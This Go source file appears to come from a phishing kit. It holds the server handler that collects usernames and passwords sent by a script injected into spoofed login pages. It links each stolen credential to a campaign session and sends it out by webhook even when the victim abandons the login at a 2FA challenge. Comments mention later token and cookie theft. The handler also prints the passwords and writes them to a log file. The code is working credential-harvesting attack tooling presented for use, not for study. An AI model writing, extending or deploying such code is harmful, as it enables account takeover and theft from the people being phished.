package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

type domCaptureRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
	URL      string `json:"url"`
}

func captureHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodOptions {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req domCaptureRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	if req.Password == "" {
		w.WriteHeader(http.StatusNoContent)
		return
	}

	// Resolve the target + tenant base domain from the request context (set by
	// mainHandler) so multi-domain captures land on the correct target/session.
	// lookupTarget(r.Host) keys off the default-domain subdomainLookup and would
	// miss on other tenant domains; roleOf/baseDomainOf are domain-agnostic.
	target := lookupTargetByRole(roleOf(r))
	session := sessionMgr.GetOrCreate(r, baseDomainOf(r))
	var campaignID string
	if session != nil {
		// Always record the credentials on the session (thread-safe) so the
		// username/password are available to whichever path emits the webhook.
		session.SetCredentials(req.Username, req.Password)
		if target != nil && session.TargetName == "" {
			session.TargetName = target.Name
		}
		_, _, campaignID, _, _ = session.Snapshot()

		// EVENT 1 — emit the password immediately for ALL targets, so the
		// credential is recorded even if the victim abandons the login mid-flow
		// (e.g. bails at a 2FA challenge). ShouldEmitPassword fires the first
		// time AND again whenever the password CHANGES — so a victim who mistypes
		// then retries overwrites the wrong password in the backend (upsert by
		// sessionId) — while deduping the DOM hook's repeated identical captures.
		// Cookie-based targets get a second, richer Event-2 webhook from
		// saveTokens once the login completes and tokens land.
		if session.ShouldEmitPassword(req.Password) {
			emitCapture(session, target)
		}
	}

	fmt.Println()
	fmt.Println("┌──────────────────────────────────────────────────────")
	fmt.Println("│ [!!!] DOM CAPTURE (client-side)")
	fmt.Printf("│ URL:      %s\n", req.URL)
	fmt.Printf("│ Username: %s\n", req.Username)
	fmt.Printf("│ Password: %s\n", req.Password)
	fmt.Printf("│ Campaign: %s\n", campaignID)
	fmt.Println("└──────────────────────────────────────────────────────")
	fmt.Println()

	entry := fmt.Sprintf("[%s] [DOM CAPTURE] campaign=%s URL: %s\n  USERNAME: %s\n  PASSWORD: %s\n\n",
		time.Now().Format(time.RFC3339), campaignID, req.URL, req.Username, req.Password)
	appendToFile(credLogFile, entry)

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.WriteHeader(http.StatusNoContent)
}
